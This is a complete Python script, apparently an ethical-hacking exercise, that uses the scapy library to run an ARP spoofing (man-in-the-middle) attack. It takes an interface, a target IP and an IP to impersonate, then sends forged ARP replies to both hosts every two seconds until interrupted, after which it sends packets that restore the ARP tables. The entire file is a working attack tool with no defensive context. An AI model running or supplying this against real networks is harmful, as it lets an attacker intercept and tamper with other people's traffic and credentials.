import scapy.all as scapy
import time
from optparse import OptionParser

def get_args():
    parse = OptionParser()
    parse.add_option(
        "-i",
        "--interface",
        dest="interface",
        help="Provide the interface you want to run the attack from"
    )
    parse.add_option(
        "-t",
        "--target",
        dest="target",
        help="Target Ip address"
    )
    parse.add_option(
        "-s",
        "--spoofed",
        dest="spoofed",
        help="spoofed Ip address"
    )

    ( options ,args ) = parse.parse_args()
    if not options.interface or not options.target or not options.spoofed:
        parse.error("Provide the params please ,type --help for more info")
    return options

def get_mac(ip):
    packet = scapy.ARP(pdst=ip ,hwdst="ff:ff:ff:ff:ff:ff")
    response = scapy.sr(packet ,timeout=1 ,verbose=False)[0]
    return response[0][1].hwsrc

def spoof(ip_target ,ip_spoofed ,interface):
    # get the mac address of target device 
    target_mac = get_mac(ip_target)
    packet = scapy.ARP(op=2 ,psrc=ip_spoofed ,pdst=ip_target ,hwdst=target_mac)
    scapy.send(packet ,verbose=False ,iface=interface)

def cleaning(ip_target ,ip_spoofer ,interface):
    target_mac = get_mac(ip_target)
    spoofer_mac = get_mac(ip_spoofer)
    packet = scapy.ARP(
        op=2,
        psrc=ip_spoofer,
        pdst=ip_target,
        hwsrc=spoofer_mac,
        hwdst=target_mac
    )
    scapy.send(packet ,verbose=False ,iface=interface)


counter = 0
options = get_args()
try :
    while True:
        spoof(options.target , options.spoofed ,options.interface)
        spoof(options.spoofed ,options.target,options.interface)
        counter += 2
        print("\r[+] Sent Packets : " + str(counter))
        time.sleep(2)

except KeyboardInterrupt:
    print("Ctrl C! Quiting...")
    print("Reseting the network to normale please wait....")
    cleaning(options.spoofed , options.target ,options.interface)
    cleaning(options.target ,options.spoofed, options.interface)



